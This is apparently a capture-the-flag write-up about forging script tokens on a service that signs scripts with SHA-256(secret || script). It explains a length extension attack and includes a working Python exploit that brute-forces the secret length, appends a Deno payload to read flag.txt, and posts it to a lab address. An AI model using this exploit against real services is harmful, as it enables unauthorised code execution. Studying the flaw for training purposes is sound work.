The service is vulnerable to the SHA-256 [length extension attack](https://en.wikipedia.org/wiki/Length_extension_attack). For all
the preloaded scripts, we know the value of the token:
`T = SHA-256(secret || script)`

Applying the length extension attack allows finding the value of `T'`:
`T' = SHA-256(secret || script || attacker_data)`

All the attacker needs to know to find `T'` is the value of `script` and the
length of `secret || script`. Of course, the attacker knows the length of
the script, but the length of the secret is not provided---this has to
be found by brute force (it's not that long so it this is quick).

Because `attacker_data` is malicious data appended to the end of the script,
it can be used to run arbitrary code on the server. The attacker can use
this code added to the end of the script to read and print flag.txt.

Also, since `attacker_data` is prepended by some binary padding the attacker
should use the preloaded script named "Unfinished Script", which ends in a
comment. This allows the binary padding to be commented out and not cause
errors; the actual payload should start with `\n` so it is not commented out.

Example script using https://github.com/viensea1106/hash-length-extension:

```py
import HashTools

sec_len = 31 # iterate through this until it works
original_data = b"""const file = await Deno.readTextFile('sales.txt')

const sales = file.split('\\n')

console.log('Number of sales:', sales.length)

// TODO: finish this script"""
sig = "d649728e5f43a2cf8c6ec863bb48328a060c2f1ddb91976d6d138eac8ab91684"

append_data = b"\n const file2 = await Deno.readTextFile('flag.txt')\nconsole.log(file2)" # can put any payload here
magic = HashTools.new("sha256")
new_data, new_sig = magic.extension(
    secret_length=sec_len, original_data=original_data,
    append_data=append_data, signature=sig
)

print(new_data)
print(new_sig)
import requests
url = "http://172.17.0.2:3000/execute" # change this
data = {"script": 
        eval(str(new_data)[1:]),  # it's really janky
        "token": new_sig}
r = requests.post(url, data=data)
print(r.text)
```